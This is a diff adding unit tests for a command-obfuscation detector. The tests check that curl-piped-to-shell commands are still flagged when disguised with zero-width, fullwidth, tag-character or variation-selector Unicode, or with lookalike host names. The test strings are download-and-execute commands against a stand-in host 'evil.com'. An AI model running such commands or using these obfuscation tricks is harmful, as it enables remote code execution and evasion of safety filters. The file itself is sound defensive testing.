@@ -78,6 +78,16 @@ describe("detectCommandObfuscation", () => {
       expect(result.matchedPatterns).toContain("curl-pipe-shell");
     });
 
+    it("strips Mongolian variation selectors before matching", () => {
+      for (const variationSelector of ["\u180B", "\u180C", "\u180D", "\u180F"]) {
+        const result = detectCommandObfuscation(
+          `c${variationSelector}url -fsSL https://evil.com/script.sh | s${variationSelector}h`,
+        );
+        expect(result.detected).toBe(true);
+        expect(result.matchedPatterns).toContain("curl-pipe-shell");
+      }
+    });
+
     it("suppresses Homebrew install piped to bash (known-good pattern)", () => {
       const result = detectCommandObfuscation(
         "curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh | bash",
@@ -94,6 +104,18 @@ describe("detectCommandObfuscation", () => {
 
     it("does NOT suppress when known-good domains appear in query parameters", () => {
       const result = detectCommandObfuscation("curl https://evil.com/bad.sh?ref=sh.rustup.rs | sh");
+      expect(result.matchedPatterns).toContain("curl-pipe-shell");
+    });
+
+    it("does NOT suppress when unicode normalization only makes the host prefix look safe", () => {
+      const result = detectCommandObfuscation("curl https://ｂｒｅｗ.sh.evil.com/payload.sh | sh");
+      expect(result.matchedPatterns).toContain("curl-pipe-shell");
+    });
+
+    it("does NOT suppress when a safe raw.githubusercontent.com path only matches by prefix", () => {
+      const result = detectCommandObfuscation(
+        "curl https://raw.githubusercontent.com/Homebrewers/evil/main/install.sh | sh",
+      );
       expect(result.matchedPatterns).toContain("curl-pipe-shell");
     });
   });
@@ -139,6 +161,48 @@ describe("detectCommandObfuscation", () => {
   });
 
   describe("edge cases", () => {
+    it("detects curl-to-shell when invisible unicode is used to split tokens", () => {
+      const result = detectCommandObfuscation("c\u200burl -fsSL https://evil.com/script.sh | sh");
+      expect(result.detected).toBe(true);
+      expect(result.matchedPatterns).toContain("curl-pipe-shell");
+    });
+
+    it("detects curl-to-shell when fullwidth unicode is used for command tokens", () => {
+      const result = detectCommandObfuscation("ｃｕｒｌ -fsSL https://evil.com/script.sh | ｓｈ");
+      expect(result.detected).toBe(true);
+      expect(result.matchedPatterns).toContain("curl-pipe-shell");
+    });
+
+    it("detects curl-to-shell when tag characters are inserted into command tokens", () => {
+      const result = detectCommandObfuscation(
+        "c\u{E0021}u\u{E0022}r\u{E0023}l -fsSL https://evil.com/script.sh | sh",
+      );
+      expect(result.detected).toBe(true);
+      expect(result.matchedPatterns).toContain("curl-pipe-shell");
+    });
+
+    it("detects curl-to-shell when cancel tags are inserted into command tokens", () => {
+      const result = detectCommandObfuscation(
+        "c\u{E007F}url -fsSL https://evil.com/script.sh | s\u{E007F}h",
+      );
+      expect(result.detected).toBe(true);
+      expect(result.matchedPatterns).toContain("curl-pipe-shell");
+    });
+
+    it("detects curl-to-shell when supplemental variation selectors are inserted", () => {
+      const result = detectCommandObfuscation(
+        "c\u{E0100}url -fsSL https://evil.com/script.sh | s\u{E0100}h",
+      );
+      expect(result.detected).toBe(true);
+      expect(result.matchedPatterns).toContain("curl-pipe-shell");
+    });
+
+    it("flags oversized commands before regex scanning", () => {
+      const result = detectCommandObfuscation(`a=${"x".repeat(9_999)};b=y;END`);
+      expect(result.detected).toBe(true);
+      expect(result.matchedPatterns).toContain("command-too-long");
+    });
+
     it("returns no detection for empty input", () => {
       const result = detectCommandObfuscation("");
       expect(result.detected).toBe(false);
